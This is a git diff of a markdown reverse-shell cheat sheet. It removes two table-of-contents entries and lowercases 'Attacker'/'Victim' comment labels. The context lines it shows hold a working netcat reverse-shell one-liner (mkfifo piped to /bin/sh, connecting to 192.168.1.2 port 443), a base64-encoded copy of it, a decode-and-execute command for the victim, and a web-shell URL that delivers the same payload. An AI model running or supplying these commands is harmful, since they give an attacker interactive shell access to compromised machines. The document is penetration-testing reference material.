@@ -12,8 +12,6 @@
       * [<kbd>fifo (URL Encode)</kbd>](#fifo-URL-Encode)
       * [<kbd>fifo (Base64)</kbd>](#fifo-URL-Encode)
   * [<kbd>Netcat Windows</kbd>](#Netcat-Windows)
-  * [<kbd>Netcat URL Encoding</kbd>](#Netcat-URL-Encoding)
-  * [<kbd>Netcat Base64 Encoding</kbd>](#Netcat-Base64-Encoding)
 - [<kbd>cURL</kbd>](#cURL)
 - [<kbd>Wget</kbd>](#Wget)
 - [<kbd>Node-RED</kbd>](#Node-RED)
@@ -170,13 +168,13 @@
   # <kbd>fifo Base64</kbd>
  
   ```bash
-  #Attacker
+  #attacker
   base64 -w 0 <<< 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.2 443 >/tmp/f'
   cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTkyLjE2OC4xLjIgNDQzID4vdG1wL2YK
   ```
 
   ```bash
-  #Victim
+  #victim
   echo 'cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTkyLjE2OC4xLjIgNDQzID4vdG1wL2YK' |base64 -d |sh
   #or
   http://192.168.1.3/cmd.php?cmd=echo 'cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTkyLjE2OC4xLjIgNDQzID4vdG1wL2YK' |base64 -d |sh
